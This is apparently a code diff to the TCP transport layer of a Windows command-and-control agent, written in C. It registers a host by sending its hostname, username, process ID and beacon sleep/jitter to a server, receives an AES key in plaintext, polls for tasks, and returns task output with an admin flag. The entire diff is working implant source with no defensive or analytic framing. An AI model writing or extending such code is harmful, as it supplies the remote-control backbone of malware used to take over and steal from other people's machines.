@@ -62,9 +62,31 @@ static uint8_t* tcp_read_msg(SOCKET s, size_t *out_len) {
     return buf;
 }
 
-// ── Send AES-GCM encrypted envelope {"t":<type>,"p":<b64_payload>} ───────────
+// ── Send plaintext registration frame {"t":"register","p":<body_json>} ───────
+// Used before AES key is negotiated; p is a raw JSON object, not base64.
+static int tcp_send_register(const char *body_json) {
+    size_t env_sz = strlen(body_json) + 24;
+    char *env = (char*)malloc(env_sz);
+    if (!env) return 0;
+    snprintf(env, env_sz, "{\"t\":\"register\",\"p\":%s}", body_json);
+    int ok = tcp_write_msg(g_tcp_sock, (const uint8_t*)env, strlen(env));
+    free(env);
+    return ok;
+}
 
-static int tcp_send_envelope(int msg_type, const char *payload_json) {
+// ── Read a frame and return it as a null-terminated string. Caller must free().
+static char* tcp_recv_raw(void) {
+    size_t resp_len=0;
+    uint8_t *resp = tcp_read_msg(g_tcp_sock, &resp_len);
+    if (!resp) return NULL;
+    char *s = (char*)realloc(resp, resp_len + 1);
+    if (!s) { free(resp); return NULL; }
+    s[resp_len] = '\0';
+    return s;
+}
+
+// ── Send AES-GCM encrypted envelope {"t":"<type>","p":"<b64_ciphertext>"} ───
+static int tcp_send_enc(const char *msg_type, const char *payload_json) {
     size_t enc_len=0;
     uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32,
         (const uint8_t*)payload_json, strlen(payload_json), &enc_len);
@@ -72,32 +94,28 @@ static int tcp_send_envelope(int msg_type, const char *payload_json) {
     char *b64 = b64_encode(enc, enc_len);
     free(enc);
     if (!b64) return 0;
-    size_t env_sz = strlen(b64) + 32;
+    size_t env_sz = strlen(msg_type) + strlen(b64) + 16;
     char *env = (char*)malloc(env_sz);
     if (!env) { free(b64); return 0; }
-    snprintf(env, env_sz, "{\"t\":%d,\"p\":\"%s\"}", msg_type, b64);
+    snprintf(env, env_sz, "{\"t\":\"%s\",\"p\":\"%s\"}", msg_type, b64);
     free(b64);
     int ok = tcp_write_msg(g_tcp_sock, (const uint8_t*)env, strlen(env));
     free(env);
     return ok;
 }
 
-// Receive envelope, decrypt, return plain JSON. Caller must free().
-static char* tcp_recv_plain(void) {
+// ── Receive AES-GCM encrypted envelope, decrypt, return plain JSON. Caller free().
+static char* tcp_recv_enc(void) {
     size_t resp_len=0;
     uint8_t *resp = tcp_read_msg(g_tcp_sock, &resp_len);
     if (!resp) return NULL;
-
-    // Extract "p" field (base64 ciphertext)
     char *b64 = agent_json_str_alloc((char*)resp, "p");
     free(resp);
     if (!b64) return NULL;
-
     size_t ct_len=0;
     uint8_t *ct = b64_decode(b64, &ct_len);
     free(b64);
     if (!ct) return NULL;
-
     size_t plain_len=0;
     uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, ct, ct_len, &plain_len);
     free(ct);
@@ -163,7 +181,7 @@ int transport_tcp_register(void) {
         username_j[_j++]=username[_i];
     }
 
-    // TCP type 0 = REGISTER
+    // Registration is plaintext — AES key not yet known
     char body[1024];
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
@@ -172,15 +190,16 @@ int transport_tcp_register(void) {
         hostname, username_j, (unsigned long)GetCurrentProcessId(),
         AGENT_SLEEP_SEC, AGENT_JITTER_PCT);
 
-    if (!tcp_send_envelope(0, body)) return 0;
+    if (!tcp_send_register(body)) return 0;
 
-    char *resp_plain = tcp_recv_plain();
-    if (!resp_plain) return 0;
+    // Server responds with plaintext {"t":"register_resp","p":{"agent_id":"...","aes_key":"...",...}}
+    char *resp_raw = tcp_recv_raw();
+    if (!resp_raw) return 0;
 
     char agent_id[64]={0}, aes_key_b64[128]={0};
-    agent_json_str(resp_plain, "agent_id", agent_id, sizeof(agent_id));
-    agent_json_str(resp_plain, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
-    free(resp_plain);
+    agent_json_str(resp_raw, "agent_id", agent_id, sizeof(agent_id));
+    agent_json_str(resp_raw, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
+    free(resp_raw);
 
     if (!agent_id[0] || !aes_key_b64[0]) return 0;
 
@@ -199,13 +218,9 @@ AgentTask* transport_tcp_beacon(int *count) {
     *count = 0;
     if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return NULL;
 
-    // TCP type 1 = BEACON
-    char body[256];
-    snprintf(body, sizeof(body), "{\"agent_id\":\"%s\"}", g_agent.agent_id);
+    if (!tcp_send_enc("beacon", "{}")) return NULL;
 
-    if (!tcp_send_envelope(1, body)) return NULL;
-
-    char *resp_plain = tcp_recv_plain();
+    char *resp_plain = tcp_recv_enc();
     if (!resp_plain) return NULL;
 
     AgentTask *tasks = agent_parse_tasks((const uint8_t*)resp_plain,
@@ -226,11 +241,10 @@ void transport_tcp_send_result(long long task_id, const char *output,
         task_id, output?output:"", error?error:"",
         is_admin?"true":"false");
 
-    // TCP type 2 = RESULT
-    tcp_send_envelope(2, body);
+    tcp_send_enc("result", body);
     free(body);
 
-    // Drain ACK
-    char *ack = tcp_recv_plain();
+    // Drain plaintext ACK {"t":"ack"} — no encrypted payload
+    char *ack = tcp_recv_raw();
     free(ack);
 }
